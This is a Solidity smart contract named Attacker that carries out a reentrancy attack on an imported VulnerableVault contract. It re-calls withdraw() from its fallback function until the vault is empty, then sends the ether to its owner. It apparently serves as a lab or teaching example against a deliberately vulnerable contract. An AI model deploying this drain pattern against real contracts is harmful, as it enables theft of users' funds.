// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "./VulnerableVault.sol";

contract Attacker {
    VulnerableVault public vault;
    address public owner;

    event Reentered(uint256 vaultBalance);

    constructor(VulnerableVault _vault) {
        vault = _vault;
        owner = msg.sender;
    }

    // Seed initial balance into the vault under this contract's address
    function depositToVault() external payable {
        vault.deposit{value: msg.value}();
    }

    function attack() external {
        vault.withdraw();
        // sweep after the loop completes
        payable(owner).transfer(address(this).balance);
    }

    // Fallback handles plain ETH because no receive() is declared
    fallback() external payable {
        if (address(vault).balance > 0) {
            emit Reentered(address(vault).balance);
            vault.withdraw();
        }
    }
}
